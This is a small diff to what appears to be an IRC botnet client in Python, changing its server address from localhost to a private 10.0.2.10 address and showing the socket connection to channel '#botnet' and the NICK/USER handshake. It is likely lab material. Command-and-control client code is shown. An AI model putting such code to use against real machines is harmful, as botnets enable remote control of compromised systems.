@@ -35,7 +35,7 @@ def irc():
     CHANNEL = "#botnet"
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("127.0.0.1", 6667))
+        s.connect(("10.0.2.10", 6667))
         s.settimeout(5)
         s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
         s.send(bytes(f"USER {NICKNAME} {NICKNAME} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
